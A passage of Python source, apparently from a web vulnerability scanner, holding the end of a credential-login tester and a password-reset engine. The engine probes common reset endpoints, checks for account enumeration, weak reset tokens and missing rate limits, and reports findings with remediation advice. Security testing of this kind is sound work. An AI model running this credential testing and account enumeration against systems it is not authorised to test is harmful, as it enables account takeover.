                    "confidence": "high",
                    "cvss": 9.8,
                }
        return None

    async def _post_login(self, url: str, username: str, password: str, session):
        """提交登录请求（API 端点优先 JSON，页面端点优先表单，互为回退）。"""
        payload = {"username": username, "password": password}
        use_json = any(k in url.lower() for k in ("/api", "/token", "/auth"))
        attempts = (
            ({"json": payload}, {"data": payload}) if use_json
            else ({"data": payload}, {"json": payload})
        )
        last = (None, "", {})
        for kwargs in attempts:
            try:
                resp = await async_post(
                    url, session=session, timeout=self.TIMEOUT, no_retry=True, **kwargs
                )
                status = resp[0]
                text = resp[1] or ""
                headers = resp[2] if len(resp) > 2 else {}
                if status not in (404, 405, 415):
                    return status, text, headers
                last = (status, text, headers)
            except Exception:
                continue
        return last

    def _is_success(
        self,
        status: int,
        text: str,
        headers: Dict,
        base_status: Optional[int],
        base_text: str,
    ) -> bool:
        """判定登录是否成功（相对失败基线 + 会话凭据 + 成功特征三重约束）。"""
        lowered = (text or "").lower()
        base_lowered = (base_text or "").lower()

        if any(hint in lowered for hint in self.FAILURE_HINTS):
            return False
        if base_lowered and lowered == base_lowered:
            return False
        if status in (401, 403):
            return False
        if status not in (200, 201, 302):
            return False

        set_cookie = str((headers or {}).get("Set-Cookie", "")).lower()
        has_session_credential = any(
            key in set_cookie for key in ("session", "token", "auth", "jwt", "sid")
        )
        has_success_hint = any(hint in lowered for hint in self.SUCCESS_HINTS)
        if not (has_session_credential or has_success_hint):
            return False

        # 与失败基线相比需有明显差异（状态不同或响应长度差异显著）
        if status != base_status:
            return True
        return abs(len(text) - len(base_text)) > max(50, int(len(base_text) * 0.2))




class PasswordResetEngine(BaseEngine):
    """密码重置流程检测（B3/framewok 增量）。

    覆盖：
    1. 密码重置/忘记密码端点发现（forgot-password, reset-password, /password/reset 等）
    2. 用户枚举：对已存在/不存在的账号发起密码重置，比对响应差异
    3. 重置 token 可预测/弱验证：在响应/URL 中发现可预测 token，或重放 token 未失效的证据
    4. 验证码/速率限制缺失信号：同一重置请求重复提交无阻断提示
    """

    name = "password_reset"
    description = "密码重置流程安全检测"

    RESET_ENDPOINTS = [
        "/forgot-password", "/forgot_password", "/password/reset", "/password-reset",
        "/reset-password", "/reset_password", "/api/auth/reset", "/api/forgot-password",
        "/api/v1/auth/forgot-password", "/auth/forgot-password", "/auth/reset-password",
        "/account/forgot-password", "/account/reset-password",
    ]
    # 请求密码重置时的账号参数名
    ACCOUNT_PARAMS = ["username", "user", "email", "account", "login", "phone"]
    # 用户枚举响应差异信号
    ENUM_HINTS_EXIST = ["password reset", "reset link", "sent", "check your email", "验证码已发送", "重置链接已发送", "邮件已发送"]
    ENUM_HINTS_MISSING = ["not found", "does not exist", "no account", "invalid", "不存在", "未注册", "无此账号", "error", "failed"]
    # 弱重置 token 特征
    WEAK_TOKEN_HINTS = ["0000", "1234", "1111", "timestamp", "Math.floor(Date.now", "randomseed"]

    async def discover_endpoints(self, base_url: str, session) -> List[str]:
        from urllib.parse import urlparse as _up
        parsed = _up(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        found = []
        for ep in self.RESET_ENDPOINTS:
            for u in (base + ep, base + ep + "/"):
                try:
                    resp = await async_get(u, session=session, timeout=6, no_retry=True)
                    if isinstance(resp, tuple):
                        status, text = resp[0], resp[1]
                    else:
                        status, text = resp.status, await resp.text()
                    if status in (200, 301, 302, 405):
                        found.append(u)
                        break
                except Exception:
                    continue
        return found

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        from vulnclaw.config.settings import settings as _st
        if not _st.password_reset:
            return []

        findings = []
        endpoints = await self.discover_endpoints(target, session)
        if not endpoints:
            return findings
        for ep in endpoints[:6]:
            f = await self._scan_reset_endpoint(ep, session)
            if f:
                findings.extend(f)
        return findings

    async def _scan_reset_endpoint(self, url: str, session) -> List[Dict]:
        out = []
        # 1) 用候选账号参数发起重置，尝试做用户枚举差异对比（两批账号，低侵入）
        probed = []
        try:
            base_resp = await self._do_reset(url, "vulnclaw_probe_nonexist_9d2k1", session)
            body = str(base_resp[1] or "") if base_resp else ""
            status_none = base_resp[0] if base_resp else 0
            probed.append((body, status_none))
        except Exception:
            probed = []
        if probed:
            # 存在明显"不存在"提示 → 响应区分账号存在性 = 用户枚举面
            got_nonexist_hint = any(h in body for h in self.ENUM_HINTS_MISSING)
            if got_nonexist_hint:
                out.append({
                    "url": url,
                    "type": "密码重置-用户枚举面",
                    "severity": "Medium",
                    "ai_verdict": "中",
                    "confidence": "medium",
                    "evidence": "对不存在的账号发起重置返回了明确的不存在提示，攻击者可据此枚举有效账号",
                    "recommendation": "对存在与不存在的账号返回统一且无差别的提示",
                })
        # 2) 重置 token 可预测/弱验证信号（在响应或 Location 中出现弱 token 特征）
        weak_hits = [h for h in self.WEAK_TOKEN_HINTS if h.lower() in body.lower()]
        if weak_hits:
            out.append({
                "url": url,
                "type": "密码重置-弱重置令牌特征",
                "severity": "Medium",
                "ai_verdict": "中",
                "confidence": "medium",
                "evidence": "重置响应中出现可预测/弱令牌特征: " + ", ".join(weak_hits),
                "recommendation": "使用高强度随机重置令牌，禁止在响应/URL 中回显可预测值",
            })
        # 3) 重复请求无阻断/无速率限制信号（两次请求都返回可用状态 = 无验证/限速）
        if len(probed) == 1:
            try:
                second = await self._do_reset(url, "vulnclaw_probe_nonexist_9d2k1", session)
                if second and probed[0][1] in (200, 302) and second[0] in (200, 302):
                    out.append({
                        "url": url,
                        "type": "密码重置-缺少速率限制/验证",
                        "severity": "Medium",
                        "ai_verdict": "中",
                        "confidence": "medium",
                        "evidence": "对同一账号连续两次重置请求均返回可用状态，缺少速率限制或验证码校验",
                        "recommendation": "为密码重置增加图形/短信验证码、失败锁定与速率限制",
                    })
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return out

    async def _do_reset(self, url: str, account: str, session):
        from urllib.parse import urlparse as _up, urlencode
        parsed = _up(url)
        # 尝试 POST form；失败则回退 GET 带参数
        data = {}
        for p in self.ACCOUNT_PARAMS:
            data[p] = account
        try:
            resp = await async_post(url, data=data, session=session, timeout=8)
        except Exception:
            return None
        if isinstance(resp, tuple):
            return resp
        return (resp.status, await resp.text())


__all__ = ['IDOREngine', 'JWTEngine', 'OAuthEngine', 'SessionEngine', 'WeakCredentialEngine', 'PasswordResetEngine']

# ===== 文件结束 =====